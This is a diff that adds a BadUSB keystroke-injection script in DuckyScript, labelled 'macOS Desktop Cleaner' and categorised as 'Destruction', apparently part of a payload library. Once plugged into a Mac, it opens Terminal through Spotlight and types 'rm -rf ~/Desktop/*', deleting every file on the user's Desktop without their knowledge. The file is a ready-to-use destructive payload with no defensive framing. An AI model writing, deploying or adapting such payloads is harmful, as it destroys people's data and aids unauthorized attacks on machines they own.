@@ -1,0 +1,18 @@
+REM Title: macOS Desktop Cleaner
+REM Author: BadUSB Library
+REM Description: Deletes all files from Desktop
+REM Target: macOS 10.15+
+REM Category: Destruction
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Delete Desktop files
+STRING rm -rf ~/Desktop/*
+ENTER
